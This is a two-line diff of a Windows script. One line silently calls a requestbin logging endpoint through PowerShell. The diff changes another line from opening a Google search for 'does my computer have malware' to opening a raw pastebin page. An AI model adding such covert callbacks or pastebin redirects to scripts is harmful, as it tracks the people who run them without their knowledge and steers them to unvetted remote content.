@@ -1,2 +1,2 @@
 powershell -Command Invoke-Webrequest -URI 'https://requestbin.whapi.cloud/1n3ia1s1'
-start https://www.google.com/search?q=does+my+computer+have+malware
+start https://pastebin.com/raw/8Yefd1B2
